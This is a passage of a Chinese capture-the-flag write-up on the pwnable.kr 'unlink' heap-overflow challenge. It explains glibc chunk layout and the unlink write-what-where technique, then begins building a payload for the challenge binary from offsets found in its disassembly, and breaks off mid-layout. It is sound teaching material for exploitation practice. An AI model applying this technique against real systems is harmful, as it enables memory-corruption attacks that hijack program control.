<!DOCTYPE html>
<html>
<head>
<title>WriteUp</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="pwnable-kr-toddler-s-bottle-unlink">PWNABLE.KR-Toddler&#39;s Bottle-unlink</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<h2 id="problem-description">Problem Description</h2>
<pre><code>Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)
</code></pre><p>连上去后，当前文件夹路径下一共有四个文件</p>
<pre><code>unlink@ubuntu:~$ ls -l
total 20
-r--r----- 1 root unlink_pwn   49 Nov 23  2016 flag
-rw-r----- 1 root unlink_pwn  543 Nov 28  2016 intended_solution.txt
-r-xr-sr-x 1 root unlink_pwn 7540 Nov 23  2016 unlink
-rw-r--r-- 1 root root        749 Nov 23  2016 unlink.c
</code></pre><p>这个unlink文件是32位的</p>
<pre><code>unlink@ubuntu:~$ file unlink
unlink: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3b89c9c89761e7ff1727d2ed9cf0117d3313a370, not stripped
</code></pre><p>题目的标题是unlink，这是堆溢出里面的知识点</p>
<p>所以来读源码，可以看到确实是堆溢出相关</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

typedef struct tagOBJ{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
}OBJ;

void shell(){
    system(&quot;/bin/sh&quot;);
}

void unlink(OBJ* P){
    OBJ* BK;
    OBJ* FD;
    BK=P-&gt;bk;
    FD=P-&gt;fd;
    FD-&gt;bk=BK;
    BK-&gt;fd=FD;
}

int main(int argc, char* argv[]){
    malloc(1024);
    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A &lt;-&gt; B &lt;-&gt; C
    A-&gt;fd = B;
    B-&gt;bk = A;
    B-&gt;fd = C;
    C-&gt;bk = B;

    printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);
    printf(&quot;here is heap address leak: %p\n&quot;, A);
    printf(&quot;now that you have leaks, get shell!\n&quot;);
    // heap overflow!
    gets(A-&gt;buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
</code></pre><p>上面这个源码其实是模拟了堆块unlink的过程，刚好可以以此来复习一下unlink相关的知识</p>
<p>malloc相关源码</p>
<ul>
<li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">Source code of glibc/malloc/malloc.c</a></li></ul>
<p>Linux下，堆块由两部分构成：<code>heap header</code>和<code>heap data</code>，堆头是4个字段一共16字节的数据，最后那两个字段在大块的堆块里会使用，暂不考虑</p>
<pre><code>struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;
    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};
</code></pre><p>第一个字段是当下一个堆块是空闲的时候，记录下一个堆块的大小，第二个字段是本堆块的大小，第三个字段指向下一个空闲的堆块，第四个字段指向前一个空闲的堆块</p>
<p>第二个字段表示本堆块的大小，需要8字节对齐，也就是说32位的数据会是这样<code>xxxxxxxx xxxxxxxx xxxxxxxx xxxxx000</code></p>
<p>后面三位空着，刚好可以拿来当做Flag，是有作用的：</p>
<ul>
<li><code>P</code>表示下一个chunk是否是空闲的</li><li><code>M</code>表示本堆块创建的方式是否是mmap</li><li><code>A</code>表示是否属于线程的<code>arena</code>，这个需要看一下我在最后面给的几篇文章理解，因为堆的分配并不是单纯的一个双向链表拆拆拆合合合的</li></ul>
<p>但是空闲的还是正在使用的堆块的这三个位数据是不一样的</p>
<p>我们可以在源码的注释里读到上面说的这些（哎，好不容易克制住了我那英语专业八级，忍不住翻译躁动的灵魂）</p>
<pre><code>/*
   malloc_chunk details:
    (The following includes lightly edited explanations by Colin Plumb.)
    Chunks of memory are maintained using a `boundary tag&#39; method as
    described in e.g., Knuth or Standish.  (See the paper by Paul
    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
    survey of such techniques.)  Sizes of free chunks are stored both
    in the front of each chunk and at the end.  This makes
    consolidating fragmented chunks into bigger chunks very fast.  The
    size fields also hold bits representing whether chunks are free or
    in use.
    An allocated chunk looks like this:
    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of
    the malloc code, but &quot;mem&quot; is the pointer that is returned to the
    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.
    Chunks always begin on even word boundaries, so the mem portion
    (which is returned to the user) is also on an even word boundary, and
    thus at least double-word aligned.
    Free chunks are stored in circular doubly-linked lists, and look like this:
    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:&#39; |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:&#39; |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
    chunk size (which is always a multiple of two words), is an in-use
    bit for the *previous* chunk.  If that bit is *clear*, then the
    word before the current chunk size contains the previous chunk
    size, and can be used to find the front of the previous chunk.
    The very first chunk allocated always has this bit set,
    preventing access to non-existent (or non-owned) memory. If
    prev_inuse is set for any given chunk, then you CANNOT determine
    the size of the previous chunk, and might even get a memory
    addressing fault when trying to do so.
    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,
    main arena, described by the main_arena variable.  When additional
    threads are spawned, each thread receives its own arena (up to a
    configurable limit, after which arenas are reused for multiple
    threads), and the chunks in these arenas have the A bit set.  To
    find the arena for a chunk on such a non-main arena, heap_for_ptr
    performs a bit mask operation and indirection through the ar_ptr
    member of the per-heap header heap_info (see arena.c).
    Note that the `foot&#39; of the current chunk is actually represented
    as the prev_size of the NEXT chunk. This makes it easier to
    deal with alignments etc but can be very confusing when trying
    to extend or adapt this code.
    The three exceptions to all this are:
     1. The special chunk `top&#39; doesn&#39;t bother using the
        trailing size field since there is no next contiguous chunk
        that would have to index off it. After initialization, `top&#39;
        is forced to always exist.  If it would become less than
        MINSIZE bytes long, it is replenished.
     2. Chunks allocated via mmap, which have the second-lowest-order
        bit M (IS_MMAPPED) set in their size fields.  Because they are
        allocated one-by-one, each must contain its own trailing size
        field.  If the M bit is set, the other bits are ignored
        (because mmapped chunks are neither in an arena, nor adjacent
        to a freed chunk).  The M bit is also used for chunks which
        originally came from a dumped heap via malloc_set_state in
        hooks.c.
     3. Chunks in fastbins are treated as allocated chunks from the
        point of view of the chunk allocator.  They are consolidated
        with their neighbors only in bulk, in malloc_consolidate.
*/
</code></pre><p>其中第三个字段和第四个字段当本堆块空闲时使用，就是说所有空闲的堆块，会使用这两个指针形成一个双向链表</p>
<p>如果该堆块不是空闲的，那么，在前两个字段的数据填充过后，就是正常可以使用的堆数据区了</p>
<p>源码里，执行free堆chunk的过程</p>
<pre><code>/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))
      malloc_printerr (&quot;corrupted double-linked list&quot;);
    else {
        FD-&gt;bk = BK;
        BK-&gt;fd = FD;
        if (!in_smallbin_range (chunksize_nomask (P))
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))
              malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);
            if (FD-&gt;fd_nextsize == NULL) {
                if (P-&gt;fd_nextsize == P)
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
                else {
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
                  }
              } else {
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
              }
          }
      }
}
</code></pre><p>稍微简化一下，这个<code>P</code>就是指当前的堆块，先不考虑其它什么是否在使用之类的，也不考虑向前和向后合并之类的</p>
<pre><code>#define unlink(AV, P, BK, FD) {
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    FD-&gt;bk = BK;
    BK-&gt;fd = FD;
}
</code></pre><p>其实很多文章里对于所谓的前和后都有不同的定义，画个图多好</p>
<p>假设我们要分配两个堆块，然后释放</p>
<p>下面这个表示还未分配的状态</p>
<pre><code>----------
空闲堆
----------
</code></pre><p>当申请第一个堆块的时候，两个指针并不存在，这里形象的表示一下位置</p>
<pre><code>----------
chunk_1-&gt;prevSize
chunk_1-&gt;Size
chunk_1-&gt;fd
chunk_1-&gt;bk
chunk_1-&gt;Data
----------
空闲堆
----------
</code></pre><p>申请第二个堆块，两个指针并不存在，这里形象的表示一下位置</p>
<pre><code>----------
chunk_1-&gt;prevSize
chunk_1-&gt;Size
chunk_1-&gt;fd
chunk_1-&gt;bk
chunk_1-&gt;Data
----------
chunk_2-&gt;prevSize
chunk_2-&gt;Size
chunk_2-&gt;fd
chunk_2-&gt;bk
chunk_2-&gt;Data
----------
空闲堆
----------
</code></pre><p>需要注意，这里申请了堆块之后，这里就不会有<code>fd</code>和<code>bk</code>两个字段</p>
<p>之后就是随意使用了，然后这个<code>随意使用</code>就包括了可能存在的溢出</p>
<p>我们来看一下释放的过程，这里有所谓的向前合并和向后合并</p>
<p>修改两个指针的过程和Windows上面堆是很类似的</p>
<pre><code>#define unlink(AV, P, BK, FD) {
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    FD-&gt;bk = BK;
    BK-&gt;fd = FD;
}
</code></pre><p>正常情况是没有问题的，但是如果我们溢出了呢？</p>
<p>我们来填充一下数据，<code>fd</code>指向的是<code>chunk_2</code>，也叫作向前，当<code>chunk_1</code>要释放了，它会判断前后两个chunk是否空闲，那么这里我们模拟向前合并的过程，前面<code>chunk_2</code>是否空闲由下下个堆块的标志位决定，所以它会找到下下个堆块，很简单，加上自己的Size数据即可找到下个堆块，所以只需要加<code>chunk_1</code>和<code>chunk_2</code>的Size即可跳到下下个堆块，然后获取标志位，当然最直接的办法就是溢出到下下个堆块，修改掉下下个堆块的Size，假装<code>chunk_2</code>是空闲的</p>
<pre><code>----------
chunk_1-&gt;prevSize
chunk_1-&gt;Size
chunk_1-&gt;fd
chunk_1-&gt;bk
chunk_1-&gt;Data
----------
(Cover:AAAA = 0x41414141)chunk_2-&gt;prevSize
(Cover:BBBB = 0x42424242)chunk_2-&gt;Size
(Cover:CCCC = 0x43434343)chunk_2-&gt;fd
(Cover:DDDD = 0x44444444)chunk_2-&gt;bk
chunk_2-&gt;Data
----------
空闲堆
----------
</code></pre><p>既然这样可以伪造出<code>chunk_2</code>是空闲的，也就是说，它可以合并，也就是<code>chunk_1</code>和<code>chunk_2</code>发生向前合并，就发生了我们之前的那个修改指针的过程，会把<code>chunk_2</code>解开</p>
<pre><code>FD = chunk_2-&gt;fd; //FD指向chunk_3
BK = chunk_2-&gt;bk; //BK指向chunk_1
FD-&gt;bk = BK; //chunk_3的后一个chunk修改为chunk_1，这个曾经是chunk_2的后一个chunk，也就是说，现在跳过了chunk_2
BK-&gt;fd = FD; //chunk_1的前一个chunk从chunk_2改为chunk_3
</code></pre><p>可是溢出了之后，数据可是有问题的，我们带入看看</p>
<pre><code>FD = chunk_2-&gt;fd; //FD = &quot;CCCC&quot; = 0x43434343
BK = chunk_2-&gt;bk; //BK = &quot;DDDD&quot; = 0x44444444
FD-&gt;bk = BK; //把&quot;0x44444444&quot;写进地址&quot;0x43434343&quot;偏移12字节的位置
BK-&gt;fd = FD; //这个就随意了
</code></pre><p>也就是说，我们可以构造一个数据，填充<code>chunk_2-&gt;bk</code>，它会有一个写入任意地址的机会</p>
<p>而我们现在要做的，就是选择一个合适的地址，把我们想写进去的数据，写进去，达到一个可利用的效果</p>
<p>其中一种构造如下，首先第一个字段随意，然后Size为<code>-4</code>，那么在定位下下个chunk的时候，就会变成<code>addr_chunk_1 + chunk_1-&gt;Size + (-4)</code>，就会定位到<code>chunk_2</code>，然后<code>-4</code>的后三位是<code>100</code>，它就误以为这是<code>chunk_3</code>的数据，所以就是表示着<code>chunk_2</code>是空闲的，<code>chunk_2-&gt;fd</code>的数据是要写入数据的地址，我们把它改为<code>free@got - 12</code>，最后<code>chunk_2-&gt;bk</code>改为shellcode的地址</p>
<pre><code>chunk_2-&gt;prevSize = 随意
chunk_2-&gt;Size = -4
chunk_2-&gt;fd = free@got - 12
chunk_2-&gt;bk = address of shellcode
</code></pre><p>然后，在执行unlink操作的时候，就会变成</p>
<pre><code>FD-&gt;bk = chunk_2-&gt;bk
-&gt; (free@got - 12) + 12 = addr_shellcode
</code></pre><p>所以这就是最基本的unlink利用，其它其实还挺多知识的，包括保护机制的绕过等</p>
<p>我们来看这道题，先定义了一个结构体</p>
<pre><code>typedef struct tagOBJ{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
}OBJ;
</code></pre><p>然后申请空间，定义三个结构体变量，使用自带的两个指针把三个堆块串起来，那个<code>gets</code>函数明显是有溢出的，所以我们可以向上面一样，溢出掉第二个堆块的一些字段，达到代码执行的效果</p>
<pre><code>int main(int argc, char* argv[]){
    malloc(1024);
    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A &lt;-&gt; B &lt;-&gt; C
    A-&gt;fd = B;
    B-&gt;bk = A;
    B-&gt;fd = C;
    C-&gt;bk = B;

    printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);
    printf(&quot;here is heap address leak: %p\n&quot;, A);
    printf(&quot;now that you have leaks, get shell!\n&quot;);
    // heap overflow!
    gets(A-&gt;buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
</code></pre><p>这里并没有使用到传统的unlink里面有的<code>free</code>函数</p>
<p>那我们来观察汇编，看看有没有可以利用的代码，下面是unlink之后的代码，我们找到可利用的地方是<code>leave</code>和<code>retn</code></p>
<pre><code>.text:080485F2                 call    unlink
.text:080485F7                 add     esp, 10h
.text:080485FA                 mov     eax, 0
.text:080485FF                 mov     ecx, [ebp+var_4]
.text:08048602                 leave
.text:08048603                 lea     esp, [ecx-4]
.text:08048606                 retn
</code></pre><p><code>leave</code>用于函数返回前恢复上一个函数的ebp</p>
<pre><code>mov esp ebp
pop ebp
</code></pre><p><code>retn</code>用于返回上一个函数</p>
<pre><code>pop eip
</code></pre><p>那如果我们控制了esp的数据，然后在retn的时候，弹给了eip，就可以控制执行流程了</p>
<p>我们在大前提下，有一个向任意地址写入任意数据的机会</p>
<p>在整个程序中，有一个获取shell的函数，所以可以把这个函数的地址写到esp</p>
<pre><code>void shell(){
    system(&quot;/bin/sh&quot;);
}
</code></pre><p>然后我们来计算偏移，最关键的一个偏移如下，也就是说我们要覆写地址<code>ebp - 0x04</code>的数据</p>
<pre><code>.text:080485FF                 mov     ecx, [ebp+var_4]
</code></pre><p>在汇编中，我们可以整理出三个结构体变量存储的地址，可以看到A的地址，然后可以计算出和<code>ebp - 0x04</code>的偏移</p>
<pre><code>&amp;A = [ebp - 0x14]
&amp;B = [ebp - 0x0C]
&amp;C = [ebp - 0x10]
</code></pre><p>且已知<code>A</code>和<code>&amp;A</code>，一个是堆地址，一个是栈地址</p>
<p>开始构造，首先把<code>A-&gt;buf[]</code>给溢出，正常堆块布局如下</p>
<pre><code>|--------------------
|A-&gt;prevSize:00000000
|A-&gt;Size    :00000000
|--------------------
|A-&gt;FD      :00000000
|A-&gt;BK      :00000000
|A-&gt;buf     :00000000
|           :00000000
|--------------------
|B-&gt;prevSize:00000000
|B-&gt;Size    :00000000
|--------------------
|B-&gt;FD      :00000000
|B-&gt;BK      :00000000
|B-&gt;buf     :00000000
|           :00000000
|--------------------
|C-&gt;prevSize:00000000
|C-&gt;Size    :00000000
|--------------------
|C-&gt;FD      :00000000
|C-&gt;BK      :00000000
|C-&gt;buf     :00000000
|           :00000000
--------------------
</code></pre><p>然后溢出<code>A-&gt;buf[]</code></p>
<pre><code>|--------------------
|A-&gt;prevSize:00000000
|A-&gt;Size    :00000000
|--------------------
|A-&gt;FD      :00000000
|A-&gt;BK      :00000000
|A-&gt;buf     :00000000(addr_system_binsh)
